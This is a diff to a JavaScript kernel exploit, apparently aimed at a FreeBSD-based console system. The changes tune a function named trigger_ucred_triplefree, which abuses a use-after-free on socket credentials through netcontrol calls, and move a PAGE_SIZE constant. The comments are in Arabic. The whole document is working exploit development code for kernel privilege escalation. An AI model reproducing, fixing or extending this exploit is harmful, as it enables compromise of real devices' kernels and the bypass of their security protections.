@@ -86,7 +86,7 @@ var BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);
 var KERNEL_PID = 0;
 var SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007);
 var FIOSETOWN = 0x8004667C;
-var PAGE_SIZE = 0x4000;
+
 var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
 var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
 var AF_UNIX = 1;
@@ -194,6 +194,7 @@ var victimRpipeFd;
 var victimWpipeFd;
 var kq_fdp;
 var kl_lock;
+var PAGE_SIZE = 0x4000;
 var tmp = malloc(PAGE_SIZE);
 var saved_fpu_ctrl = 0;
 var saved_mxcsr = 0;
@@ -1429,9 +1430,8 @@ function trigger_ucred_triplefree() {
 
     // هنا التغيير المهم: نستخدم dummy_fd مش uaf_socket
     var ctrl_buf = malloc(8);
-    write32(ctrl_buf, uaf_socket);
-    send_notification("step 5: ctrl_buf[0..3] (uaf_socket) = " + read32(ctrl_buf));
-
+    write32(ctrl_buf, dummy_fd);
+    send_notification("step 5: ctrl_buf = dummy_fd = " + dummy_fd);
     netcontrol(-1, 0x20000007, ctrl_buf, 8);
 
     // 6) محاولة إصلاح refcount بشكل خفيف (نخليها زي ما هي مؤقتًا)
@@ -1439,7 +1439,7 @@ function trigger_ucred_triplefree() {
     send_notification("iov0=" + iov_sock_0 + ", iov1=" + iov_sock_1);
     for (var i = 0; i < 2; i++) {
         trigger_iov_recvmsg();
-        var w = write(new BigInt(iov_sock_1), tmp, 1);
+        var w = write(new BigInt(iov_sock_1), tmp_byte, 1);
         wait_iov_recvmsg();
         var r = read(new BigInt(iov_sock_0), tmp_byte, 1);
 
